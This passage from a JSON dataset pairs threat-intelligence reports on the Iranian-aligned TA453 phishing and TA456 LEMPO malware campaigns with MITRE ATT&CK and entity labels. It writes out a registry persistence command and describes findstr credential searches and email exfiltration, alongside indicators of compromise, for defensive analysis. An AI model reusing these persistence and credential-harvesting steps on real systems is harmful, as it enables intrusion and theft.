"CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Operation SpoofedScholars: A Conversation with TA453\nJuly 13, 2021\n### Key Takeaways\n* [TA453](https://www.proofpoint.com/us/blog/threat-insight/badblood-ta453-targets-us-and-israeli-medical-research-personnel-credential), an\u00a0Iranian - state\u00a0aligned actor,\u00a0masqueraded as British scholars\u00a0to covertly target individuals of intelligence interest to the Iranian government in what Proofpoint has dubbed Operation\u00a0SpoofedScholars.\n* The email conversations were benign until TA453 provided a link to a compromised website hosting a credential harvesting page.\n* The use of a legitimate but actor-compromised website is an increase in sophistication compared to TA453\u2019s historical Tactics, Techniques, and Procedures of using actor-controlled credential phishing websites.\n* Proofpoint has worked with the appropriate authorities to conduct victim notification.\n### Overview\nMasquerading as\u00a0UK scholars\u00a0with the University of London\u2019s\u00a0School of Oriental and African Studies\u00a0(SOAS), the\u00a0threat actor TA453 has been covertly approaching individuals\u00a0since\u00a0at least\u00a0January 2021 to solicit sensitive information.\nThe threat actor, an APT who we assess with high confidence supports Islamic\u00a0Revolutionary Guard Corps (IRGC) intelligence collection efforts,\u00a0established backstopping for their credential phishing infrastructure by compromising a legitimate site of a highly regarded academic institution to deliver personalized credential harvesting pages disguised as registration links.\nIdentified targets included experts in Middle Eastern affairs from think tanks, senior professors from well-known academic institutions, and journalists specializing in Middle Eastern coverage.\nThese connection attempts were detailed and extensive, often including lengthy conversations prior to presenting the next stage in the attack chain.\nOnce the conversation was established, TA453 delivered a \u201cregistration link\u201d to a legitimate but compromised website belonging to the University of London\u2019s SOAS radio.\nThe\u00a0compromised site\u00a0was configured to capture a variety of credentials.\nOf note, TA453 also targeted the personal email accounts of at least one of their targets.\nIn subsequent phishing\u00a0emails, TA453\u00a0shifted their tactics and\u00a0began delivering the registration link earlier\u00a0in their engagement with the target\u00a0without requiring extensive conversation.\nThis operation, dubbed\u00a0SpoofedScholars,\u00a0represents one of the more sophisticated TA453 campaigns\u00a0identified\u00a0by\u00a0Proofpoint.\n![Text Box](data:image;base64_removed,)\u00a0\n### Chatting with TA453\nIn early 2021, a TA453 persona,\u00a0\u201cDr.Hanns\u00a0Bjoern\u00a0Kendel, Senior Teaching and Research Fellow at SOAS University in London,\u201d\u00a0used email address\u00a0hannse.kendel4[@]gmail.com\u00a0to solicit conversations\u00a0with targets.\nThe following is\u00a0a brief summary\u00a0of\u00a0an\u00a0example conversation\u00a0observed\u00a0by Proofpoint Threat Research:\u00a0\nTA453\u00a0sent an initial email\u00a0trying to entice the target with a prospective invitation to an online conference on \u201cThe US Security Challenges in the Middle East.\nTA453 strived to connect with the\u00a0individual\u00a0via phone to discuss the invitation; however, after the target hedged\u00a0and emphatically stated that they wanted a written proposal with the details, TA453 acquiesced with conference specifics.\nAfter a little back and forth that verified the target\u2019s interest, TA453\u00a0provided a detailed invitation to the fake conference (Figure 1).\nThe conversation concluded with TA453 attempting to get the target to connect via\u00a0videoconferencing.\n![Text, letter Description automatically generated](data:image;base64_removed,)\u00a0\n*Figure 1. Fake conference invitation.*\n### Conversation Analysis\nThroughout the conversation, Proofpoint identified a few interesting themes:\u00a0\n* TA453 demonstrates passable English skills and is open to voice communication via videoconferencing.\n* TA453 demonstrates an interest in mobile phone numbers, possibly for mobile malware or additional phishing.\n* TA453 repeatedly demonstrated a desire to connect with the target in real-time.\n### Personal Targeting\nIn addition to\u00a0Hanns\u2019 solicitations, at least one target received a credential harvesting email to their personal email account.\nThis attempt did not masquerade as Dr.\u00a0Kendel\u00a0but did still attempt to harvest credentials from the target.\nCurrently, Proofpoint does not have more information on this specific kill chain.\n### Campaign\u00a0Breakdown\n**Targets**\u00a0\nTA453 targets in\u00a0Operation\u00a0SpoofedScholars\u00a0can be clustered into three main categories that are consistent with the IRGC\u2019s historical collection priorities.\n* Senior think tank personnel\n* Journalists focused on Middle Eastern affairs\n* Professors\nThese groupings consistently have information of interest to the Iranian government, including, but not limited to, information about foreign policy, insights into Iranian dissident movements, and understanding of U.S. nuclear negotiations, and most of the identified targets have been previously targeted by TA453.\nTargeting appeared to be highly selective,\u00a0with less than ten organizations targeted, according to Proofpoint data.\n**Infrastructure**\u00a0\nOnce TA453 established a time for the target to activate their invitation, the\u00a0TA453\u00a0persona\u00a0provided the personalized link to\u00a0the\u00a0intended victim.\nThe link led to a \u201cWebinar Control Panel\u201d on a legitimate\u00a0but compromised\u00a0website\u00a0belonging to University of London\u2019s SOAS, a research institution.\nAccording to Proofpoint research, while TA453 does appear to have elevated privileges allowing them to create credential harvesting pages at\u00a0soasradio[.]org, other pages on the site continue to host legitimate SOAS-affiliated content.\nTA453 strengthened the credibility of the attempted credential harvest by\u00a0utilizing\u00a0personas\u00a0masquerading as legitimate affiliates\u00a0of SOAS\u00a0to deliver the malicious links.\nThe displayed webpage (Figure\u00a02) offers users the ability to use \u201cOpenID\u201d to log in with the following mail providers; Google, Yahoo, Microsoft, iCloud, Outlook, AOL, mail.ru, Email, and Facebook.\nThe website URI\u00a0was\u00a0hxxps://soasradio[.]org/connect/?memberemailid=\u00a0[RedactedInitials\u00a0of Target]-[String of alphanumeric characters].\n![Graphical user interface Description automatically generated](data:image;base64_removed,)\u00a0\n*Figure\u00a02. SOAS displayed webpage.*\nWhen a particular provider is clicked, a pop-up box\u00a0(Figure\u00a03)\u00a0displays the actual credential phishing box.\nOf the options, Google, Microsoft, and\u00a0Email buttons prefilled the target\u2019s email address.\nBased on the variety of email providers along with TA453\u2019s insistence that the target log on when TA453 was online, Proofpoint assesses that TA453 was planning on immediately validating the captured credentials manually.\n![microsoft ](/sites/default/files/inline-images/MicrosoftTeams-image%20%287%29.png)\n*Figure\u00a03. \u201cAOL\u00a0login\u00a0window\u201d*\u00a0\nHanns\u00a0Kendel\u00a0was not the only SOAS scholar spoofed by TA453\u00a0during\u00a0Operation\u00a0SpoofedScholars.\nMonths later,\u00a0TA453 began spoofing\u00a0Tolga\u00a0Sinmazdemir, another\u00a0individual associated with\u00a0SOAS.\u00a0\nThese\u00a0emails\u00a0solicited contributions to a\u00a0\u201cDIPS Conference\u201d\u00a0and would have likely followed a similar kill chain\u00a0discussed above.\nIn mid-May,\u00a0TA453\u00a0returned, using a different\u00a0email\u00a0(hanse.kendel4[@]gmail.com)\u00a0to recruit for a webinar.\n**Attribution**\u00a0\nAs discussed previously in Proofpoint\u2019s research on TA453\u2019s\u00a0[BadBlood](/us/blog/threat-insight/badblood-ta453-targets-us-and-israeli-medical-research-personnel-credential \"BadBlood: TA453 Targets US and Israeli Medical Research Personnel in Credential Phishing Campaigns \")\u00a0campaign, Proofpoint analysts cannot independently confirm that TA453 is part of the IRGC.\u00a0\nHowever, the tactics and techniques used by the group and their overall targeting detected by Proofpoint is in line with IRGC intelligence collection priorities, which gives us high confidence in our assessment that\u00a0TA453 operates in\u00a0support\u00a0of\u00a0the IRGC.\u00a0The IRGC, specifically the IRGC Intelligence Organization, collects intelligence and conducts operations in support of a variety of assigned responsibilities.\nAccording to the Meir Amit Intelligence and Terrorism Information Center\u2019s November 2020\u00a0[report](https://www.terrorism-info.org.il/en/the-intelligence-organization-of-the-irgc-a-major-iranian-intelligence-apparatus/), some of the IRGC IO\u2019s responsibilities include foiling political subversion, combating western cultural penetration, and supporting the arrest of Iranian dual nationals.\nLikewise, attribution specifically for\u00a0Operation\u00a0SpoofedScholars\u00a0is based on TTP similarities to previous TA453 campaigns and consistency with TA453\u2019s historical targeting.\nTA453 often uses free email providers to spoof individuals familiar to their targets to increase the likelihood of successful compromise.\nAdditionally, as previously discussed, TA453 concentrates their credential phishing to specific individuals of interest\u00a0to\u00a0collect\u00a0intelligence through exfiltration of sensitive email and contacts or initial access for future phishing campaigns.\n**Mitigation**\u00a0\nFor specific mitigations against Operation\u00a0SpoofedScholars, Proofpoint recommends\u00a0investigating network traffic to\u00a0soasradio[.]org,\u00a0specifically\u00a0URIs starting with\u00a0hxxps://soasradio[.]org/connect/?memberemailid=.\nAdditionally, emails from\u00a0hanse.kendel4[@]gmail.com,\u00a0hannse.kendel4[@]gmail.com,\u00a0and\u00a0\u00a0t.sinmazdemir32[@]gmail.com\u00a0should be considered suspect and investigated.\nBroader mitigation efforts against TA453 campaigns include increased awareness and investigation of unusual communication from professional contacts.\nAcademics, journalists, and think tank\u00a0scholars\u00a0should\u00a0practice caution and verify the identity of the individuals offering them unique opportunities, especially if those opportunities occur virtually.\nUsing multifactor authentication\u00a0provides another layer of protection against TA453 credential harvesting.\n### **Conclusion**\nTA453\u00a0illegally obtained access to a website belonging to a world class academic institution\u00a0to\u00a0leverage the\u00a0compromised infrastructure to harvest the credentials of their intended targets.\nThe use of legitimate,\u00a0but compromised,\u00a0infrastructure represents an increase in TA453\u2019s sophistication\u00a0and will almost certainly\u00a0be reflected in future campaigns.\nTA453 continues to\u00a0iterate,\u00a0innovate,\u00a0and collect\u00a0in support of IRGC collection priorities.\nWhile\u00a0some\u00a0of the identified selectors\u00a0no longer appear to be active in TA453 operations, Proofpoint assesses with high confidence that TA453 will continue\u00a0to\u00a0spoof scholars\u00a0around the world\u00a0in support of\u00a0TA453\u2019s intelligence collection\u00a0operations\u00a0in\u00a0support of Iranian government interests.\nAcademics, journalists, and think tank personnel\u00a0should practice caution and verify the\u00a0identity of the individuals offering them unique opportunities.\n**ET** **Signature**\u00a0\n2033317\u00a0-\u00a0ET Malware Operation\u00a0SpoofedScholars\u00a0Activity (GET)\u00a0", "mitre_ids": ["G0059", "G0059", "G0059", "TA0006", "T1566", "T1056", "G0059", "T1056", "G0059", "TA0006", "T1056", "G0059", "G0059", "T1566", "G0059", "T1566", "G0059", "G0059", "G0059", "G0059", "T1566", "G0059", "G0059", "G0059", "G0059", "G0059", "G0059", "G0059", "T1566", "TA0006", "G0059", "G0059", "G0059", "G0059", "G0059", "T1056", "G0059", "T1566", "T1056", "G0059", "G0059", "G0059", "G0059", "G0059", "T1566", "T1566", "G0059", "G0059", "G0059", "G0059", "G0059", "G0059", "G0059", "G0059", "T1566", "G0059", "G0059", "TA0006", "G0059", "G0059", "G0059", "G0059", "G0059", "G0059"], "anno_name_label": [], "cti_entity_class": ["CE", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "I Knew You Were Trouble: TA456 Targets Defense Contractor with Alluring Social Media Persona\nJuly 28, 2021\n### Key Takeaways\n* TA456, an\u00a0Iranian-state\u00a0aligned actor, spent\u00a0years\u00a0masquerading as the persona \u201cMarcella Flores\u201d in an attempt to infect the machine of an employee of an aerospace defense contractor with malware.\n* The malware, dubbed\u00a0by Proofpoint as\u00a0LEMPO, was designed to establish persistence,\u00a0perform reconnaissance, and exfiltrate sensitive information.\n* TA456 actively targets smaller subsidiaries and contractors in support of efforts to\u00a0compromise larger\u00a0defense contractors using a supply chain\u00a0compromise.\n* While targeting defense contractors is not new for TA456, this campaign uniquely establishes the group\u00a0as one of the most\u00a0determined\u00a0Iranian-aligned threat actors tracked by Proofpoint because of its significant use of social engineering, cross platform communication, and general persistence.\n### Overview\nProofpoint researchers have identified a years-long social engineering and targeted malware campaign by the Iranian-state aligned threat actor TA456.\nUsing the social media persona \u201cMarcella Flores,\u201d TA456 built\u00a0a relationship across corporate and personal communication platforms\u00a0with\u00a0an employee of a\u00a0small subsidiary of an\u00a0aerospace defense contractor.\nIn early June 2021, the threat actor attempted to capitalize on this relationship by sending the target malware via\u00a0an ongoing email communication chain.\nDesigned to conduct reconnaissance on the target\u2019s machine, the macro-laden\u00a0document\u00a0contained personalized content and demonstrated\u00a0the importance TA456 placed on the target.\nOnce the malware,\u00a0which is\u00a0an updated version of\u00a0[Liderc](https://blog.talosintelligence.com/2019/09/tortoiseshell-fake-veterans.html)\u00a0 that Proofpoint has dubbed LEMPO,\u00a0establishes\u00a0persistence, it\u00a0can\u00a0perform reconnaissance on\u00a0the\u00a0infected\u00a0machine,\u00a0save the reconnaissance details to the host,\u00a0exfiltrate\u00a0sensitive\u00a0information to an actor-controlled email account\u00a0via\u00a0SMTPS, and then cover\u00a0its\u00a0tracks by deleting that day\u2019s\u00a0host\u00a0artifacts.\nThis campaign exemplifies the persistent nature of certain state aligned threats and the\u00a0human engagement\u00a0they are\u00a0willing to\u00a0conduct in\u00a0support\u00a0of\u00a0espionage operations.\nIn mid-July, Facebook disrupted\u00a0a\u00a0network of\u00a0similar\u00a0personas they attributed to Tortoiseshell.\nLEMPO, the malware,\u00a0whose\u00a0delivery\u00a0Proofpoint\u00a0disrupted, along with the network\u00a0of personas,\u00a0are\u00a0attributed to TA456.\nThis\u00a0actor\u00a0is believed to be\u00a0loosely aligned\u00a0with the Islamic Revolutionary Guard Corps (IRGC)\u00a0via association with\u00a0the\u00a0Iranian company\u00a0Mahak\u00a0Rayan\u00a0Afraz\u00a0(MRA), according to\u00a0Facebook\u2019s analysis.\n![TA456](/sites/default/files/inline-images/TA456.png)\n### Campaign Breakdown\nProofpoint data shows that over at least eight months, \u201cMarcella\u00a0(Marcy)\u00a0Flores\u201d sent TA456\u2019s target benign\u00a0email\u00a0messages, photographs, and a video to establish her veracity and build rapport with\u00a0the intended victim.\nAt one time, TA456 attempted to send a benign, but\u00a0flirtatious\u00a0video via a OneDrive\u00a0URL.\u00a0In early June,\u00a0a TA456\u00a0actor\u00a0self-identified as\u00a0\u201cMarcy\u201d\u00a0sent another OneDrive link, this time masquerading as a diet survey\u00a0(Figure 1).\n![Survey](/sites/default/files/inline-images/DIET%20SURVEY.png)\n*Figure 1. The diet survey email sent to the target.*\nThe OneDrive\u00a0URL\u00a0delivered a .rar\u00a0file\u00a0(dfddbd09ccea598c4841f1abbc927f1c661d85d4bd9bcb081f7c811212d8a64a)\u00a0containing a .xlsm\u00a0(Figure 2)\u00a0(612bdfb4f6eaf920a7a41fa06de8d99f6ecf6ad147374efa6eb1d5aff91df558).\nUsing previous conversation topics with the target, the .xlsm\u00a0purported\u00a0to be pandemic diet assistance and requested\u00a0that the user enable\u00a0content to access the privacy protected portions of the file.\nIf\u00a0the content is enabled,\u00a0the\u00a0macro\u00a0will\u00a0create and hide the directory \\Appdata\\Perflog\u00a0and\u00a0then write LEMPO, a very simple but ingenious plaintext stealer comprised of Visual Basic Script (VBS), to that directory (Schedule.vbs 1534f95f49ddf2ada38561705f901e5938470c1678d6a81f0f4177ba7412ef5b).\nAfter authoring the\u00a0VBS, the\u00a0Excel macro\u00a0will\u00a0add a registry key\u00a0(HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Schedule /t REG\\_SZ /d C:\\Users\\[redacted\\_username]\\AppData\\Perflog\\Schedule.vbs /f)\u00a0to ensure LEMPO is run\u00a0upon\u00a0user login.\n![diet survey](/sites/default/files/inline-images/MicrosoftTeams-image%20%288%29.png)\n*Figure\u00a02. The diet\u00a0survey\u00a0.xlsm\u00a0file.*\nThe macro in the\u00a0Excel document\u00a0also contains code to connect via HTTP POST to\u00a0showip[.]net.\nThe response, along with the results of \"net use\" and \"netstat -nao\" are stored in a hidden sheet within the .xlsm, reminiscent of the technique described in Facebook's July 15th announcement.\nProofpoint analysts assess this may indicate code partially remaining from an earlier iteration of the tool that came before LEMPO or a desire for redundancy in TA456's reconnaissance tooling.\n### LEMPO\nThe\u00a0LEMPO reconnaissance\u00a0tool is\u00a0a\u00a0Visual Basic\u00a0Script\u00a0dropped by\u00a0an\u00a0Excel\u00a0macro.\nLeveraging built-in Windows commands\u00a0it\u00a0enumerates the host in a variety of ways, records the collected data and then exfiltrates the intelligence to an actor-controlled email\u00a0account\u00a0using\u00a0Microsoft\u2019s\u00a0Collaboration Data Objects (CDO).\nCDO,\u00a0previously known as OLE Messaging or Active Messaging, is an application programming interface included with Microsoft Windows and Microsoft Exchange Server products.\nWhile\u00a0most of\u00a0this analysis is based off\u00a0the sample blocked by Proofpoint (1534f95f49ddf2ada38561705f901e5938470c1678d6a81f0f4177ba7412ef5b)\u00a0in\u00a0June 2021, we also identified\u00a0\u00a0a similar\u00a0sample (da65aa439e90d21b2cf53afef6491e7dcdca19dd1bbec50329d53f3d977ee089)\u00a0uploaded to\u00a0a public malware repository with an upload date of June 2020.\n### Reconnaissance\nLEMPO collects\u00a0the following information and records\u00a0it to %temp%\\Logs.txt\u00a0\n* Date\u00a0and\u00a0time\n* Computer\u00a0and\u00a0usernames\n* System information\u00a0via WMIC\u00a0os,\u00a0sysaccount,\u00a0\u00a0environment,\u00a0and\u00a0computer\u00a0system\u00a0commands\n* Antivirus products\u00a0located in the \u201cSecurityCenter2\u201d path\n* Drives\n* Tasklist\n* Software\u00a0and\u00a0version\n* Net\u00a0users and\u00a0user\u00a0details\nFollowing the connectivity check, detailed in the following section, LEMPO writes the following to\u00a0%temp%\\Logs.txt\u00a0\n* Firewall rules\n* List of running processes via\u00a0Powershell\u00a0Get-Process\n* IP config\n* Domain hosts, users, computers, and local groups\n* Trusted domains\n* Network shares\n* Arp cache\n* Tracert\n* External IP (via showip.net)\n* Connections (netstat -nao)\n### Connectivity\nPrior to the network focused reconnaissance, LEMPO checks\u00a0connectivity by reaching out to Yandex, Google, Yahoo, Github, Mailchimp, Mega, Arxiv (an online\u00a0academic\u00a0repository specializing in electrical engineering and scientific research),\u00a0and Twitter using ping and curl\u00a0(Figure\u00a03).\nThe June 2020 version of LEMPO includes\u00a0only\u00a0a connectivity check to ford[.]com.\n![Text Description automatically generated](data:image;base64_removed,)\u00a0\n*Figure\u00a03. *After finishing that additional recon, LEMPO moves Logs.txt from %temp% to \\Perflog.\nLEMPO then checks to ensure the Registry Key previously mentioned has been added and then uses\u00a0the\u00a0findstr\u00a0command\u00a0to\u00a0identify\u00a0files\u00a0containing \u201cuser,\u201d\u00a0\u201cpass,\u201d\u00a0and \u201cvpn.\nThe\u00a0findstr\u00a0command returns any matching lines\u00a0which\u00a0could\u00a0collect usernames and passwords from the computer.\nLogs.txt is then compressed into Logs.zip\u00a0\n### Exfiltration\nLEMPO\u00a0uses\u00a0hardcoded credentials with\u00a0Microsoft\u2019s\u00a0CDO\u00a0to exfiltrate the information over SMTPS\u00a0on port 465.\nIn the June 2021 version of LEMPO, TA456 uses the same\u00a0Yahoo email address to send and receive the exfiltrated information.\nIn the 2020 version of LEMPO, TA456 sent from a Yandex account to a\u00a0Tutanota\u00a0email account.\nNotably, the Yandex email within the 2020 version of the\u00a0LEMPO\u00a0implant masqueraded as\u00a0large technology company focused on supporting the energy industry.\nAfter exfiltrating the information, LEMPO\u00a0sleeps\u00a0for 30\u00a0seconds\u00a0and then\u00a0deletes\u00a0both Logs.txt and Logs.zip.\n### There\u2019s Something About\u00a0Marcy\n\u201cMarcella (Marcy) Flores\u201d\u00a0was\u00a0conversing with the targeted aerospace employee since at least November 2020 and\u00a0was\u00a0friends with them on social media since at least 2019.\nBesides the Gmail account used for attempted malware delivery, Marcella maintained\u00a0a\u00a0now suspended\u00a0[Facebook profile]\n(https://web.archive.org/web/*/https:/www.facebook.com/marcella.flores.14019).\n![Graphical user interface Description automatically generated](data:image;base64_removed,)\u00a0\n*Figure\u00a04. *Open-source\u00a0research indicates\u00a0\u201cMarcella\u201d interacted with TA456\u2019s target on social media starting in late 2019.\nThe earliest publicly available Facebook profile photo\u00a0of \u201cMarcella\u201d\u00a0was uploaded on May 30, 2018.\nProofpoint\u2019s analysis indicates the profile bears strong similarities to\u00a0fictitious\u00a0profiles previously used by Iranian APTs\u00a0to socially engineer targets of intelligence value.\nThe\u00a0\u201cMarcella\u201d\u00a0profile appeared\u00a0to be friends with multiple individuals who publicly identify as defense contractor employees\u00a0and\u00a0who are\u00a0geographically dispersed from\u00a0\u201cMarcella\u2019s\u201d\u00a0alleged location in Liverpool, UK.\u00a0\nOn July 15,\u00a02021,\u00a0[Facebook announced](https://about.fb.com/news/2021/07/taking-action-against-hackers-in-iran/)\u00a0they had disrupted a network of Facebook and Instagram personas, including \u201cMarcella\u2019s,\u201d\u00a0they attributed to\u00a0the\u00a0Iranian-aligned actor.\n### Targets\nTA456 routinely conducts reconnaissance campaigns\u00a0disguised as news related spam\u00a0that target individuals employed by\u00a0aerospace\u00a0defense contractors.\nThe targeting of\u00a0U.S.\u00a0defense contractors, particularly those supporting contracts in the Middle\u00a0East,\u00a0is consistent with historical Iranian\u00a0cyber\u00a0activity.\nAdditionally,\u00a0Proofpoint has observed\u00a0TA456\u00a0targeting\u00a0individuals\u00a0employed at\u00a0multiple\u00a0subcontractors\u00a0and subsidiaries of larger defense companies.\nThis is possibly\u00a0an effort\u00a0to target the\u00a0primary\u00a0contractor\u00a0via less secure downstream component suppliers that share a network environment.\nOpen-source\u00a0research\u00a0indicated\u00a0the individual targeted\u00a0by\u00a0\u201cMarcella\u201d\u00a0in\u00a0this campaign\u00a0works\u00a0as a\u00a0supply chain\u00a0manager.\nThis is consistent with TA456\u2019s TTP of\u00a0targeting business\u00a0and\u00a0information technology-related individuals\u00a0within their target\u00a0organization.\n### Attribution\nProofpoint attributes this campaign to TA456, an Iranian-aligned adversary focused on espionage efforts against\u00a0defense\u00a0industrial\u00a0base employees and contractors, particularly those supporting efforts in the Middle East.\nTA456 overlaps with activity tracked as Tortoiseshell,\u00a0and\u00a0Imperial Kitten.\nOn July 15, 2021, Facebook\u00a0[attributed](https://about.fb.com/news/2021/07/taking-action-against-hackers-in-iran/)\u00a0a portion of Tortoiseshell\u2019s activity to\u00a0Mahak\u00a0Rayan\u00a0Afraz\u00a0(MRA), an Iranian IT company\u00a0with ties to the IRGC.\u00a0\nBased on previous\u00a0malware analysis and\u00a0historical\u00a0open-source\u00a0research, Proofpoint concurs with this attribution.\nAdditionally,\u00a0LEMPO\u00a0shares multiple similarities with\u00a0[Tortoiseshell\u2019s\u00a0Liderc](https://blog.talosintelligence.com/2019/09/tortoiseshell-fake-veterans.html), including extensive machine reconnaissance, exfiltration via email, hardcoded email addresses with similar formatting, and overall pattern of targeting companies and individuals aligned with the American defense industrial base.\n### Outlook\nTA456 demonstrated a significant operational investment by cultivating a relationship with a\u00a0target\u2019s\u00a0employee over\u00a0years\u00a0in order to\u00a0deploy LEMPO to conduct reconnaissance into a highly secured target\u00a0environment within the defense industrial base.\nFacebook\u2019s\u00a0announcement\u00a0demonstrated\u00a0TA456 had established an extensive network of these personas\u00a0dedicated\u00a0to\u00a0enabling cyberespionage operations.\nWhile Proofpoint did not observe\u00a0the\u00a0delivery\u00a0of\u00a0any remote access trojans or\u00a0command and control\u00a0channels\u00a0like\u00a0TA456\u2019s\u00a0[Syskit](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/tortoiseshell-apt-supply-chain),\u00a0the information potentially gathered by LEMPO\u00a0could be operationalized in a variety of ways.\nThese include\u00a0the utilization of stolen VPN credentials, exploitation of vulnerabilities in the identified software, or the customization of\u00a0more advanced\u00a0malware delivered from\u00a0\u201cMarcella.\nTA456\u2019s\u00a0dedication to significant\u00a0social engineering\u00a0engagement,\u00a0benign\u00a0reconnaissance of targets prior to deploying malware,\u00a0and\u00a0their cross platform kill chain\u00a0establish\u00a0TA456\u00a0to be one of the most\u00a0resourceful\u00a0Iranian-aligned threats tracked by Proofpoint.\nThe \u201cMarcella Flores\u201d persona is likely\u00a0not the only\u00a0one in use by TA456, making it important for\u00a0those working within or tangentially to the defense industrial base\u00a0to be vigilant\u00a0when engaging with\u00a0unknown\u00a0individuals regardless of whether it is via work or personal accounts.", "mitre_ids": ["G0003", "G0003", "TA0003", "TA0010", "TA0007", "G0003", "T1195", "G0003", "TA0003", "TA0011", "G0003", "G0003", "T1566", "G0003", "T1059", "TA0003", "TA0007", "T1070", "T1041", "G0003", "G0003", "G0003", "G0003", "G0003", "G0003", "T1566", "T1566", "T1059", "T1059", "TA0010", "T1059", "T1059", "T1547", "T1547", "T1059", "T1071", "S0104", "T1049", "G0003", "TA0007", "T1059", "TA0007", "T1059", "T1071", "T1033", "T1082", "T1518", "T1083", "T1057", "T1518", "T1033", "T1016", "T1057", "T1059", "S0097", "T1547", "T1005", "T1005", "T1041", "G0003", "T1071", "G0003", "T1070", "T1566", "G0003", "G0003", "T1566", "G0003", "G0003", "G0003", "G0003", "G0003", "G0003", "G0003", "G0003", "TA0011", "G0003", "T1203", "G0003", "G0003", "T1566", "G0003"], "anno_name_label": [["MALWARE", "LEMPO"], ["MALWARE", "LEMPO"], ["MALWARE", "LEMPO"], ["MALWARE", "LEMPO"], ["TOOL", "net use"], ["MALWARE", "LEMPO"], ["MALWARE", "LEMPO"], ["MALWARE", "LEMPO"], ["MALWARE", "LEMPO"], ["TOOL", "wmic"], ["MALWARE", "LEMPO"], ["MALWARE", "LEMPO"], ["TOOL", "curl"], ["MALWARE", "LEMPO"], ["MALWARE", "LEMPO"], ["MALWARE", "LEMPO"], ["MALWARE", "LEMPO"], ["MALWARE", "LEMPO"], ["MALWARE", "LEMPO"], ["MALWARE", "LEMPO"], ["MALWARE", "LEMPO"], ["MALWARE", "LEMPO"], ["MALWARE", "LEMPO"], ["MALWARE", "LEMPO"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE"]}, {"cti_report": "As Delta Variant Spreads, COVID-19 Themes Make Resurgence In Email Threats\u202f\nAugust 24, 2021\n### Key Findings:\n* Proofpoint researchers observed an increase in COVID-19\u00a0related\u00a0threats since\u00a0late June\u00a02021.\n* Threat actors are taking advantage of the\u00a0increased\u00a0interest and\u00a0infection spread\u00a0related to the Delta variant.\n* Proofpoint researchers observed high-volume COVID-19 related campaigns from malware including\u00a0RustyBuer, Formbook,\u00a0and Ave Maria.\n### Overview\nMultiple distinct\u00a0types of high-volume threats have\u00a0pivoted\u00a0back to using COVID-19\u00a0social engineering\u00a0themes as the global concern about the Delta variant continues to rise.\nThe newly observed campaigns related to the identified malware follow a lull in COVID-19-themed\u00a0threat campaigns\u00a0through the Spring\u00a0and early Summer\u00a0of 2021.\n### Campaign Details\nProofpoint has tracked ongoing threats leveraging COVID-19 and\u00a0related\u00a0coronavirus themes since the beginning of the pandemic.\nTA542, known\u00a0to distribute\u00a0Emotet, first began using COVID-19 in email threats in January 2020.\nAlthough the virus\u00a0has\u00a0remained an ongoing theme,\u00a0Proofpoint researchers observed a significant increase in the number of messages leveraging COVID-19 themes\u00a0in recent months.\nSince late June 2021, Proofpoint has observed high volume COVID-19 themed campaigns distributing\u00a0RustyBuer, Formbook, and\u00a0Ave Maria malware, in addition to multiple corporate phishing\u00a0attempts\u00a0to steal Microsoft\u00a0and O365 credentials.\nProofpoint researchers also identified an increase in\u00a0[business email compromise](https://www.proofpoint.com/us/blog/threat-insight/bec-taxonomy-proofpoint-framework)\u00a0 threats leveraging COVID-19 themes in this timeframe.\nThe increase in COVID-19 themes in Proofpoint data aligns with\u00a0public\u00a0interest in the\u00a0highly contagious\u00a0[COVID-19 Delta variant](https://www.yalemedicine.org/news/5-things-to-know-delta-variant-covid).\nAccording to\u00a0global\u00a0Google\u00a0Trend\u00a0data,\u00a0worldwide\u00a0searches for \u201cDelta variant\u201d\u00a0first peaked\u00a0the last week in\u00a0June 2021\u00a0and\u00a0have\u00a0continued through August\u00a02021\u00a0so far.\n![Delta](/sites/default/files/inline-images/Figure%201_1.png)\n*Figure 1. Google Trend data for searches related to \u201cDelta variant.\u201d*\nThe\u00a0increase in COVID-19 related threats\u00a0is global.\nProofpoint observed tens of thousands of messages\u00a0intended for\u00a0recipients\u00a0in various industries worldwide.\nOpen-source data\u00a0also supports\u00a0a\u00a0greater\u00a0threat actor adoption of COVID-19 themes recently.\nSouth Korea,\u00a0for example,\u00a0[recently raised](http://tbs.seoul.kr/eFm/newsView.do?typ_800=N&idx_800=3445116&seq_800=20437693)\u00a0 its cyber threat warning\u00a0level\u00a0in response to an increase of threats related to its COVID-19 relief programs.\nThroughout the pandemic, threat actors have leveraged the fear and uncertainty felt by communities everywhere and the\u00a0COVID-19\u00a0virus became a popular lure for social engineering activities.\nAs vaccines\u00a0became\u00a0available, threat actors began using themes related to vaccination status.\nThreat actors often\u00a0[paired COVID-19 